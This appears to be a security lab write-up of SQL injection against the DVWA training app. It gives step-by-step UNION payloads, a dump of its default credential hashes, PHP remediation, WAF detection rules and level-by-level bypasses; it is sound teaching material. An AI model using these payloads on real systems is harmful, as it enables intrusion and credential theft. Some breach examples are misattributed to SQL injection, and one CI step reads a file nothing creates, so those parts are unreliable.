markdown
# SQL Injection Vulnerability Analysis

## 📋 Overview
SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code through user input fields, potentially exposing, modifying, or deleting sensitive data.

**Vulnerability Type:** CWE-89  
**OWASP Category:** A03:2021 - Injection  
**Severity:** CRITICAL (CVSS 9.8)

## 🔍 Discovery Process

### Initial Testing

**Payload:** `1'`  
**Response:** SQL syntax error message  
**Conclusion:** Application is vulnerable to SQL injection

**Error Received:**

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1


This error confirms that user input is being directly concatenated into SQL queries without proper sanitization.

## 🎯 Exploitation Methodology

### Step 1: Confirm Exploitability

**Payload:** `1 OR 1=1`  
**Underlying Query:** `SELECT * FROM users WHERE id = 1 OR 1=1`  
**Result:** Retrieved all 5 user records  
**Impact:** Complete authentication bypass

### Step 2: Enumerate Column Count

**Method:** ORDER BY clause incrementing

| Payload | Result |
|---------|--------|
| `1' ORDER BY 1#` | Success |
| `1' ORDER BY 2#` | Success |
| `1' ORDER BY 3#` | Error |

**Conclusion:** Query returns 2 columns

### Step 3: Extract Database Name

**Payload:**
sql
1' UNION SELECT null, database()#


**Result:** Database name = `dvwa`

### Step 4: Extract Table Names

**Payload:**
sql
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa'#


**Tables Discovered:**
- `users` (contains credentials)
- `guestbook` (contains messages)

### Step 5: Extract Column Names

**Payload:**
sql
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#


**Columns in 'users' Table:**
- user_id
- first_name
- last_name
- user (username)
- password (hash)
- avatar
- last_login
- failed_login

### Step 6: Extract Credentials

**Payload:**
sql
1' UNION SELECT user, password FROM users#


**Credentials Extracted:**

| Username | Password Hash (MD5) | Cracked Password |
|----------|---------------------|------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

## 📸 Evidence

All exploitation steps documented with screenshots:

![SQL Syntax Error](../../screenshots/sql-01-syntax-error.png)
*Initial vulnerability discovery - single quote causes SQL error*

![Boolean Bypass](../../screenshots/sql-02-boolean-bypass.png)
*Authentication bypass using boolean logic*

![Database Enumeration](../../screenshots/sql-03-database-name.png)
*Database name extraction*

![Table Discovery](../../screenshots/sql-04-table-names.png)
*Enumeration of database tables*

![Column Discovery](../../screenshots/sql-05-column-names.png)
*Column names extracted from users table*

![Credential Extraction](../../screenshots/sql-06-credentials-extracted.png)
*Complete credential dump - proof of exploitation*

## 🛡️ Impact Assessment

**Severity: CRITICAL**

### Immediate Impacts
1. **Complete Data Breach** - All user credentials exposed
2. **Authentication Bypass** - Login as any user without password
3. **Data Integrity Compromise** - Ability to modify/delete records
4. **Privilege Escalation** - Gain administrative access
5. **Lateral Movement** - Pivot to other systems using stolen credentials

### Business Impacts
- **Compliance Violations:** GDPR, HIPAA, PCI-DSS breaches
- **Reputational Damage:** Loss of customer trust
- **Financial Loss:** Fines, lawsuits, recovery costs
- **Operational Disruption:** System downtime for remediation

### Real-World Examples
- **2019 Instagram:** 49 million records exposed via SQL injection
- **2018 British Airways:** 380,000 customers affected, £20M fine
- **2017 Equifax:** 147 million records compromised

## 🔒 Remediation Strategies

### 1. Prepared Statements (PRIMARY DEFENSE)

**Vulnerable Code:**
php
<?php
// NEVER DO THIS - Direct concatenation
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($connection, $query);
?>


**Secure Code:**
php
<?php
// ALWAYS USE PREPARED STATEMENTS
$id = $_GET['id'];

// Prepare statement with placeholder
$stmt = $connection->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");

// Bind parameter with type specification
$stmt->bind_param("i", $id);  // 'i' = integer

// Execute query safely
$stmt->execute();

// Get results
$result = $stmt->get_result();

// Clean up
$stmt->close();
?>


**Why This Works:**
- The `?` placeholder is treated as DATA, never as SQL code
- Database driver handles all escaping automatically
- User input CANNOT alter query structure
- This is the ONLY truly effective defense

### 2. Input Validation

**Whitelist Validation:**
php
<?php
// Validate input type
if (!is_numeric($id)) {
    http_response_code(400);
    die("Invalid input: ID must be numeric");
}

// Cast to correct type
$id = (int)$id;

// Range validation
if ($id <= 0 || $id > 999999) {
    http_response_code(400);
    die("Invalid input: ID out of range");
}
?>


### 3. Least Privilege Database Access

**Create Limited User:**
sql
-- Create application-specific database user
CREATE USER 'webapp_user'@'localhost' IDENTIFIED BY 'strong_random_password';

-- Grant ONLY necessary permissions
GRANT SELECT, INSERT, UPDATE ON webapp_db.users TO 'webapp_user'@'localhost';
GRANT SELECT, INSERT, UPDATE ON webapp_db.posts TO 'webapp_user'@'localhost';

-- NEVER grant these to web applications:
-- DROP, CREATE, DELETE, ALTER, GRANT, FILE, SUPER, SHUTDOWN

-- Apply changes
FLUSH PRIVILEGES;


**Impact:** Even if exploited, attacker cannot:
- Drop tables
- Create new users
- Read arbitrary files
- Execute system commands

### 4. Secure Error Handling

**Vulnerable:**
php
<?php
$result = mysqli_query($connection, $query) 
    or die(mysqli_error($connection));  // NEVER DO THIS!
?>


**Secure:**
php
<?php
if (!$result) {
    // Log detailed error internally
    error_log("SQL Error: " . mysqli_error($connection));
    error_log("User Input: " . $id);
    error_log("IP: " . $_SERVER['REMOTE_ADDR']);
    error_log("Timestamp: " . date('Y-m-d H:i:s'));
    
    // Show generic message to user
    http_response_code(500);
    die("An error occurred. Please contact support if the problem persists.");
}
?>


### 5. Web Application Firewall (WAF)

**ModSecurity Rule:**
apache
# Detect common SQL injection patterns
SecRule ARGS "@detectSQLi" \
    "id:1000,\
    phase:2,\
    deny,\
    status:403,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR}',\
    severity:CRITICAL"


**Cloudflare WAF Rule:**

(http.request.uri.query contains "union select") or
(http.request.uri.query contains "' or '1'='1") or
(http.request.uri.query contains "order by") or
(http.request.uri.query contains "information_schema")


### 6. Security Testing in CI/CD

**Pipeline Integration:**
yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run Bandit (Python SAST)
        run: |
          pip install bandit
          bandit -r . -f json -o bandit-report.json
      
      - name: Dependency Vulnerability Scan
        run: |
          pip install safety
          safety check --json
      
      - name: OWASP ZAP Baseline Scan
        run: |
          docker run -v $(pwd):/zap/wrk/:rw \
            -t owasp/zap2docker-stable zap-baseline.py \
            -t http://staging-app/ -J zap-report.json
      
      - name: Block deployment if critical issues
        run: |
          if [ $(jq '.critical_issues' security-report.json) -gt 0 ]; then
            echo "Critical security issues found - blocking deployment"
            exit 1
          fi


## 🔄 Testing on Higher Security Levels

### Medium Security

**Code Changes:**
php
<?php
// Uses mysqli_real_escape_string()
$id = mysqli_real_escape_string($connection, $_POST['id']);
$query = "SELECT * FROM users WHERE user_id = $id";
?>


**Bypass Technique:**
- Quotes are escaped, but numeric injection still works
- Payload: `1 OR 1=1` (no quotes needed)

### High Security

**Code Changes:**
php
<?php
// Uses LIMIT 1 to restrict results
$id = $_GET['id'];
$id = stripslashes($id);
$id = mysqli_real_escape_string($connection, $id);
$query = "SELECT * FROM users WHERE user_id = '$id' LIMIT 1";
?>


**Bypass:**
- More difficult but still possible
- Requires advanced techniques (time-based blind injection)

### Impossible Security

**Code Changes:**
php
<?php
// Uses prepared statements
$stmt = $connection->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
?>


**Result:** UNBREAKABLE with SQL injection

## 🎓 Key Takeaways

1. ✅ **Always use prepared statements** - No exceptions
2. ✅ **Never trust user input** - Validate everything
3. ✅ **Implement defense in depth** - Multiple layers
4. ✅ **Least privilege access** - Limit database permissions
5. ✅ **Hide error messages** - Don't leak database structure
6. ✅ **Test regularly** - Integrate security in CI/CD
7. ✅ **Stay updated** - Monitor OWASP Top 10 and CVE databases
